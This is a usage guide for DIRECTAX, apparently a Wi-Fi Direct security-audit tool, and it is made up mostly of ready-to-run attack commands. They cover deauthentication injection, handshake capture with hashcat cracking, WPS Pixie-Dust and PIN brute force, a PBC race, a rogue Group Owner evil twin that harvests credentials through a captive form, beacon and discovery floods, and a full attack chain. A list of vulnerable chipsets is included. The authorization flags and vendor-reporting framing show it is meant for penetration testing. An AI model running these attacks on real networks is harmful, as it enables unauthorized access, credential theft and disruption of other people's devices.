# DIRECTAX Usage Guide

All commands assume you run from the repo root as root. Replace `wlan0`
with your monitor-capable interface and `wlan1` with a second managed
interface where the guide calls for one.

## 0. Preflight

Verify tooling and adapter capability.

```
sudo python3 scan.py --preflight
sudo iw list | grep -A2 -E 'Supported interface modes|monitor|P2P'
sudo rfkill unblock wifi
```

Expected: `all required tools present`, `monitor` in supported modes,
`P2P-client` and `P2P-GO` in the mode list on the P2P interface.

## 1. Passive discovery

Sweep P2P social channels 1/6/11, collect every P2P Device / GO / Client
that beacons or probes during the window.

```
sudo python3 scan.py discover -i wlan0 --duration 60 --output run1.json
```

Options:

| Flag           | Default | Meaning                                        |
|----------------|---------|------------------------------------------------|
| `--duration`   | 60      | seconds to sniff                               |
| `--dwell`      | 500     | ms per social channel before hopping           |
| `--output`     | -       | write full device table as JSON                |

Output per device (JSON): `device_addr`, `interface_addrs`, `bssids`,
`ssids` (`DIRECT-XX-<name>` for GOs), `role` (`GO` | `peer`), channels,
frame counts, parsed P2P IE, parsed WSC IE. The stdout table shows WPS
state per device (`wps`, `pbc`, `pin`, `locked`).

## 2. Frame sniff

Records every P2P Public Action frame (GO-Neg, PD, SD, Invitation) and
every EAPOL / WSC M1..M8 into two pcaps.

```
sudo python3 scan.py sniff -i wlan0 --duration 120 \
     --p2p-pcap evidence/p2p.pcap \
     --eapol-pcap evidence/eapol.pcap \
     --bssid aa:bb:cc:dd:ee:ff        # filter EAPOL to one GO
```

Open with Wireshark using display filter `wlan.fixed.category_code == 4
&& wlan.fixed.publicact == 9` to isolate P2P action frames.

## 3. Deauth against a P2P GO

The default reason code is 7 (class-3 frame from non-associated STA)
which most stacks handle. Injection targets both directions.

```
sudo python3 scan.py deauth -i wlan0 \
     --go aa:bb:cc:dd:ee:ff \
     --client 11:22:33:44:55:66 \
     --count 128 --duration 5 \
     --authorized \
     --output findings.json
```

Confirmation criterion: pcap under `evidence/` contains at least one
EAPOL frame or Reassoc-Request from the target client during the window.
If nothing is captured the finding stays at HYPOTHESIS internally and is
not written.

Use `--client ff:ff:ff:ff:ff:ff` to broadcast; some drivers filter this.

## 4. EAPOL 4-way capture

Best chained after deauth: the client reconnects and the handshake goes
over the air.

```
# Terminal 1
sudo python3 scan.py handshake -i wlan0 \
     --go aa:bb:cc:dd:ee:ff --channel 6 --duration 30

# Terminal 2 (after handshake starts listening)
sudo python3 scan.py deauth -i wlan0 --go aa:bb:cc:dd:ee:ff \
     --client 11:22:33:44:55:66 --count 32 --duration 3 --authorized
```

Offline crack:

```
hcxpcapngtool -o hs.22000 evidence/handshake_aabbccddeeff.pcap
hashcat -m 22000 hs.22000 /usr/share/wordlists/rockyou.txt
```

## 5. WPS Pixie-Dust

One-shot key recovery when the GO uses a weak PRNG for E-S1/E-S2.

```
sudo python3 scan.py pixie -i wlan0 \
     --go aa:bb:cc:dd:ee:ff --channel 6 \
     --timeout 120 --authorized \
     --output findings.json
```

Success output includes `pin`, `psk`, `ssid` in the finding's
`observable` field. Full reaver log is written to
`evidence/pixie_<bssid>.log`.

Known-vulnerable chipset families that pixiewps handles:

- Broadcom BCM4318, 4321, 4324, 43225, 43227, 43228
- Ralink RT2860, RT2870, RT3050, RT3070, RT3572, RT5350, RT5370
- MediaTek MT7620, MT7628 (WPS 1.0h implementations)
- Realtek RTL8671, RTL819x, RTL8188 (pre-2015 firmware)

## 6. WPS External Registrar PIN brute

Only run when Pixie-Dust fails and `AP Setup Locked == false`. Reaver is
tuned to reduce lockout risk.

```
sudo python3 scan.py wps-pin -i wlan0 \
     --go aa:bb:cc:dd:ee:ff --channel 6 \
     --session-time 3600 --authorized \
     --output findings.json
```

Reaver defaults inside DIRECTAX: `--delay 2`, `--timeout 15`,
`--lock-delay 300`, `-x 5` (5 failed attempts triggers 5s pause).
Session file `evidence/reaver_<bssid>.wpc` allows resume.

## 7. WPS PBC race

Requires a managed interface running `wpa_supplicant` with a control
socket at `/var/run/wpa_supplicant/<iface>`.

```
sudo wpa_supplicant -B -i wlan1 -c /etc/wpa_supplicant/p2p.conf
sudo python3 scan.py pbc-race -i wlan1 \
     --target aa:bb:cc:dd:ee:ff \
     --walk-time 30 --authorized \
     --output findings.json
```

Minimum `p2p.conf`:

```
ctrl_interface=/var/run/wpa_supplicant
update_config=1
device_name=directax
device_type=1-0050F204-1
config_methods=push_button virtual_push_button keypad display
p2p_disabled=0
```

Race condition: the attack starts the moment the target enters
walk-time. Automate by polling `wpa_cli p2p_peers` for the target and
firing when Selected Registrar flips true.

## 8. Rogue Group Owner (evil-twin)

Impersonates a target GO's SSID + BSSID on the same channel, serves a
DHCP lease and a captive HTTP form. hostapd owns the interface, so use
a dedicated adapter.

```
sudo python3 scan.py rogue-go -i wlan1 \
     --ssid 'DIRECT-XX-TargetTV' \
     --bssid aa:bb:cc:dd:ee:ff \
     --channel 6 \
     --device-name 'TargetTV' \
     --psk 'lab-only-1234' \
     --duration 300 \
     --authorized \
     --output findings.json
```

Confirmation: `evidence/roguego_<bssid>_dnsmasq.log` contains a
`DHCPACK` line for the victim MAC, or `roguego_<bssid>_captive.log`
contains a `CREDS ` line.

Combine with deauth against the real GO to force roaming:

```
# tab 1
sudo python3 scan.py rogue-go ... --authorized
# tab 2 (on the monitor iface)
sudo python3 scan.py deauth -i wlan0mon --go <real-bssid> --authorized
```

## 9. Beacon flood

Fills scanner UI with fake `DIRECT-XX-Fake<rand>` GOs. Useful to test
scanner memory limits and to mask a real target during recon.

```
sudo python3 scan.py beacon-flood -i wlan0 \
     --count 50 --channel 6 --duration 30 \
     --name-prefix Ghost --authorized
```

## 10. Provision Discovery flood

Exhausts per-peer PD state on the target and, on some Broadcom /
Realtek stacks, raises a UI notification for every request.

```
sudo python3 scan.py pd-flood -i wlan0 \
     --target aa:bb:cc:dd:ee:ff \
     --count 1000 --authorized
```

Confirmation is soft: capture the target UI with a phone camera and
attach as evidence, or observe that legitimate PD-Req from your test
peer no longer receives a PD-Rsp.

## 11. Automated audit

Runs discovery, then per-target deauth + handshake + pixiedust, then
the offline novelty gate. Nothing that could brick firmware runs
unattended (no PIN brute).

```
sudo python3 scan.py audit -i wlan0 \
     --discovery-time 60 \
     --target-mac aa:bb:cc:dd:ee:ff \
     --authorized \
     --output audit.json
```

Omit `--target-mac` to audit every P2P GO found in the discovery
window.

## 12. Novelty gate

Runs the offline known-issue table against a findings file. Flags
duplicates of Pixie CVEs, WPS brute (CVE-2011-5053), KRACK,
FragAttacks, Kr00k, wpa_supplicant CVE-2023-52160, Realtek P2P
overflow CVE-2022-27193.

```
sudo python3 scan.py novelty-check --input audit.json --output triaged.json
```

Output prints `<id>  <title>  ->  <CVE|novel>` per finding.

## 13. Environment variables

| Variable              | Effect                                    |
|-----------------------|-------------------------------------------|
| `WFDX_LOGLEVEL`       | `DEBUG` / `INFO` / `WARNING`              |
| `DIRECTAX_NO_BANNER`  | any value skips the CLI banner            |

## 14. Evidence layout

Every attack writes under `--evidence-dir` (default `evidence/`):

```
evidence/
  deauth_<bssid>.pcap
  handshake_<bssid>.pcap
  pixie_<bssid>.log
  reaver_<bssid>.log
  reaver_<bssid>.wpc
  roguego_<bssid>_hostapd.log
  roguego_<bssid>_dnsmasq.log
  roguego_<bssid>_captive.log
  p2p.pcap
  eapol.pcap
```

Every path is referenced from the corresponding JSON finding's
`evidence` field, so the vendor can reproduce from the JSON alone.

## 15. Chaining recipe (typical engagement)

```
# recon
sudo python3 scan.py discover -i wlan0 --duration 90 --output devices.json

# pick a target, confirm channel + WPS state from stdout table
TARGET=aa:bb:cc:dd:ee:ff
CH=6

# passive corpus
sudo python3 scan.py sniff -i wlan0 --bssid $TARGET --duration 120

# try pixie first (cheapest)
sudo python3 scan.py pixie -i wlan0 --go $TARGET --channel $CH \
     --authorized --output pixie.json

# if pixie fails and lock=false, try PIN brute
sudo python3 scan.py wps-pin -i wlan0 --go $TARGET --channel $CH \
     --session-time 7200 --authorized --output wps.json

# fallback: EAPOL capture + offline PSK
sudo python3 scan.py handshake -i wlan0 --go $TARGET --channel $CH \
     --output hs.json &
sudo python3 scan.py deauth -i wlan0 --go $TARGET --authorized

# novelty gate on everything
jq -s '{findings: (map(.findings) | add)}' pixie.json wps.json hs.json > all.json
sudo python3 scan.py novelty-check --input all.json --output triaged.json
```

## 16. Common failures

| Symptom                                    | Cause / fix                                       |
|--------------------------------------------|---------------------------------------------------|
| `driver on wlan0 does not report monitor`  | wrong chipset, or NetworkManager owns it: `sudo systemctl stop NetworkManager` |
| `interface_add wlan0mon` fails             | rfkill soft-block: `sudo rfkill unblock wifi`     |
| Reaver: `WPS transaction failed (0x03)`    | AP Setup Locked engaged; wait 60s and retry, drop `--lock-delay` lower |
| Pixiewps: `not vulnerable`                 | modern chipset; skip to PIN brute or handshake    |
| hostapd: `nl80211: kernel reports: match already configured` | monitor VIF still up: `iw dev wlan0mon del` |
| No EAPOL captured after deauth             | client uses PMF (802.11w); deauth ignored; drop the attack |
